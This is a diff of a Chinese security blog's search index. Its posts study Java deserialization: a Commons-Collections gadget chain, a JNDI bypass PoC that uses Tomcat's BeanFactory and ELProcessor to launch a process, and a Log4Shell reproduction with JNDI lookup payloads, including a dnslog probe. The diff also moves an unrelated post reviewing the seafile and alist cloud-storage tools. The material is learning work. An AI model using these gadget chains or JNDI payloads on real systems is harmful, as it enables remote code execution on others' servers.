class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//构造BadAttributeValueExpException</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="comment">//把链断开，用反射重新连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">BadAttribute_class</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val_field</span> <span class="operator">=</span> BadAttribute_class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val_field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">Test.Serialize(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//Test.Unserialize(&quot;test.ser&quot;);</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>JAVA</category>
@@ -738,6 +665,79 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>java反序列化之jndi</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/</url>
+    <content><![CDATA[<h1 id="jndi加载本地类利用">jndi加载本地类利用</h1>
+<p>上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于<code> JDK &lt; 8u191</code>的情况,在高版本的jdk中,我们可以通过<code>加载本地类</code>的方法进行命令执行。</p>
+<p>之前在Reference中传入了一个工厂类名,然后让程序去找这个工厂类的位置,最终加载到了我们所构建的恶意类并调用了其构造方法,而这次我们将直接利用本地存在的工厂类去执行命令。</p>
+<p>这里利用的是<code>tomcat8</code>带有的<code>BeanFactory类</code>,这个类中带有method.invoke可以通过反射来调用任意方法。</p>
+<p>首先导入依赖（这里org.apache.el如果导入失败的话需要换个源,我是用<code>阿里云</code>的源）：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>poc代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+<p>客户端：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="image-20230402123833616.png" alt="image-20230402123833616"></p>
+<p>利用链：<br>
+InitialContext#lookup</p>
+<p>GenericURLContext#lookup</p>
+<p>RegistryContext#lookup</p>
+<p>RegistryContext#decodeObject</p>
+<p>NamingManager#getObjectInstance</p>
+<p>BeanFactory#getObjectInstance</p>
+<p>反射执行的语句：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span>  <span class="title class_">ELProcessor</span>()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new  java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<ol>
+<li>“”.getClass() 返回字符串对象的Class对象。</li>
+<li>Class.forName() 可以根据类的名称返回对应的Class对象。</li>
+<li>newInstance() 可以使用Class对象实例化一个对象。</li>
+<li>getEngineByName() 返回指定名称的脚本引擎对象,这里是JavaScript引擎对象。</li>
+<li>eval() 方法用于执行脚本。</li>
+<li>ProcessBuilder 类可以启动一个新进程并执行操作系统命令。</li>
+</ol>
+<h1 id="jndi-log4j2">jndi+log4j2</h1>
+<p>Log4j2是Apache软件基金会下的一个开源项目,是Java编程语言的一种流行的、模块化的<code>日志记录工具</code>,用于记录应用程序的运行状态信息和调试信息。</p>
+<p>而在2021年11月log4j2爆出了一个代码执行漏洞,影响范围非常大,2.14.1版本及之前的都存在该漏洞</p>
+<p>而这个漏洞的利用正好与jndi注入有关</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>首先导入依赖（版本小于2.14.1即可）：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>编写log4j2的配置文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--全局参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p %c&#123;1&#125;:%L - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;logDir&quot;</span>&gt;</span>/data/logs/dust-server<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;rolling_file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义输出到控制台 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">follow</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--控制台只输出level及以上级别的信息--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同一来源的Appender可以定义多个RollingFile,定义按天存储日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;rolling_file&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">fileName</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server_%d&#123;yyyy-MM-dd&#125;.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志保留策略,配置只保留七天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Delete</span> <span class="attr">basePath</span>=<span class="string">&quot;$&#123;logDir&#125;/&quot;</span> <span class="attr">maxDepth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfFileName</span> <span class="attr">glob</span>=<span class="string">&quot;dust-server_*.log&quot;</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfLastModified</span> <span class="attr">age</span>=<span class="string">&quot;7d&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Delete</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230402194044347.png" alt="image-20230402194044347"></p>
+<p>这里就输出了操作系统的一些信息,这实际上是log4j2自带的一些功能</p>
+<p>但除此之外,它还支持调用<code>lookup</code>,那么这里就会存在我们之前所说的命令执行漏洞</p>
+<h2 id="漏洞探测">漏洞探测</h2>
+<p>修改测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://foei54.dnslog.cn/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>foei54.dnslog.cn为我们在dnslog平台得到的url</p>
+<p>运行测试代码并查看dns记录,出现以下结果则说明漏洞存在</p>
+<p><img src="image-20230402200004246.png" alt="image-20230402200004246"></p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>修改测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将之前测试jndi的服务端程序运行起来,然后运行测试代码</p>
+<p>效果：</p>
+<p><img src="image-20230402194654780.png" alt="image-20230402194654780"></p>
+<p>可以看到命令被成功执行了</p>
+<p>实际上在正常的生产环境中,log4j2会写入非常多的事件,哪怕是一个简单的用户登录事件,这时候我们就可以修改用户名的内容为${jndi:rmi://foei54.dnslog.cn/Object}来测试漏洞是否存在。</p>
+<p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></p>
+<p><a href="https://blog.csdn.net/lumingzhu111/article/details/121871114">一问三不知之log4j2漏洞简析</a></p>
+<p><a href="https://www.freebuf.com/articles/web/341857.html">深入学习 Log4j2 漏洞原理以及绕过手段</a></p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反序列化之动态代理,cc1和cc6</title>
     <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86,cc1%E5%92%8Ccc6/</url>
     <content><![CDATA[<h1 id="动态代理">动态代理</h1>
@@ -795,60 +795,6 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>seafile和alist使用体验</title>
-    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="seafile">seafile</h3>
-<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
-<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
-<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
-<p>优点：</p>
-<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
-<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
-<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
-<p>缺点：</p>
-<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
-<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
-<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
-<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="alist">alist</h3>
-<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
-<p>alist的部署更加简单，具体可以看这位博主的文章</p>
-<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
-<p>同样讲一下alist的优缺点</p>
-<p>优点：</p>
-<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
-<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
-<p>缺点：</p>
-<p>​    1.没有客户端工具只能通过网页端访问资源</p>
-<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
-<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
-<p>​    4.有点“重”，内容多的话要加载很久</p>
-<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
-<h3 id="alist的安全问题">alist的安全问题</h3>
-<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
-<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
-<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
-<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
-<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
-<p>同时也可以参考下面这位up主的视频</p>
-<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
-<h3 id="最后">最后</h3>
-<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>alist</tag>
-        <tag>seafile</tag>
       </tags>
   </entry>
   <entry>
@@ -927,6 +873,136 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>seafile和alist使用体验</title>
+    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="seafile">seafile</h3>
+<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
+<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
+<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
+<p>优点：</p>
+<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
+<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
+<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
+<p>缺点：</p>
+<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
+<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
+<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
+<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="alist">alist</h3>
+<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
+<p>alist的部署更加简单，具体可以看这位博主的文章</p>
+<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
+<p>同样讲一下alist的优缺点</p>
+<p>优点：</p>
+<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
+<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
+<p>缺点：</p>
+<p>​    1.没有客户端工具只能通过网页端访问资源</p>
+<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
+<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
+<p>​    4.有点“重”，内容多的话要加载很久</p>
+<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
+<h3 id="alist的安全问题">alist的安全问题</h3>
+<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
+<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
+<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
+<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
+<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
+<p>同时也可以参考下面这位up主的视频</p>
+<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
+<h3 id="最后">最后</h3>
